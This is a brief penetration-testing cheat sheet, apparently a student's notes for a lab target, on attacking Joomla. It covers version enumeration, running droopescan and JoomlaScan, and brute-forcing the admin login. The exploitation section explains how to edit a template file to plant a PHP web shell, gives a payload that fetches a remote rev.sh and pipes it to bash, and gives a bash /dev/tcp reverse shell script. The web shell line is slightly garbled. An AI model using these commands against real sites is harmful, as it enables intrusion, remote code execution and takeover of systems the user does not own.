# Enumeration

```
Get Joomla version
curl -s http://dev.inlanefreight.local/administrator/manifests/files/joomla.xml | xmllint --format -

```

# Droopescan

```
sudo pip3 install droopescan
droopescan scan joomla --url http://dev.inlanefreight.local/
```

# Joomlascan

```
Install dependencies for python 2.7
sudo python2.7 -m pip install urllib3
sudo python2.7 -m pip install certifi
sudo python2.7 -m pip install bs4

git clone https://github.com/drego85/JoomlaScan
python2.7 joomlascan.py -u http://domain.com
```

# Joomla-bruteforce

```
git clone https://github.com/ajnik/joomla-bruteforce
sudo python3 joomla-brute.py -u http://domain.com -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin
```

# Exploitation

```
1. Click on `Templates` on the bottom left under `Configuration` to pull up the templates menu.
2. Let's choose <Template> under the `Template` column header. This will bring us to the `Templates: Customise` page.
2. Choose erro.php or something similar and the following web shell.

system($_GET[''cmd]); 

or....

<?php system("curl <IP>:<PORT>/rev.sh|bash"); ?>  ### This will call out server to get the following reverse shell. !!ADD AT THE END

echo -e '#!/bin/bash\nsh -i >& /dev/tcp/<IP>/<PORT> 0>&1' > rev.sh


```